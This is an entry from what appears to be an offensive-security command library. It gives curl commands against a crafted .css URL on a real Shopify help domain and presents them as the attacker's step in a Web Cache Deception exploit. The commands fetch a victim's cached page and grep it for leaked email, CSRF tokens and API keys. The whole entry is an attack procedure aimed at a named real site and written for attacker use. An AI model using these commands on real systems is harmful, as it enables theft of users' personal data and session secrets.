---
data: >-
  curl
  https://help.shopify.com/es/manual/your-account/copyright-and-trademark/abcdefg.css
tags:
  - web
  - recon
  - exfiltration
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 6bb35b18-6d1a-4c00-9b69-0f8e231d097a
created_at: '2025-12-13T09:00:34.422Z'
updated_at: '2025-12-13T09:00:34.422Z'
verified: false
validated: true
submitted: true
---
# curl Retrieve Cached Page

## Command

```bash
curl https://help.shopify.com/es/manual/your-account/copyright-and-trademark/abcdefg.css
```

## Description

This command uses curl to access a crafted URL and retrieve a cached page containing leaked user information from a Web Cache Deception exploit, without requiring authentication headers. It is used by the attacker after the victim has visited the URL to fetch the cached 404 page with embedded sensitive data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | The crafted URL to retrieve (e.g., https://help.shopify.com/es/manual/your-account/copyright-and-trademark/abcdefg.css) | Yes |

## Examples

### Basic Usage

```bash
curl https://help.shopify.com/es/manual/your-account/copyright-and-trademark/abcdefg.css
```

### Advanced Usage

```bash
curl -s https://help.shopify.com/es/manual/your-account/copyright-and-trademark/abcdefg.css | grep 'email'
```

## Expected Output

The cached 404 page source code, including user's personal information such as username, email, CSRF token, and potentially API keys.

## Related

- [[procedures/Exploit-Web-Cache-Deception-via-Path-Confusion]]
- [[tools/curl]]
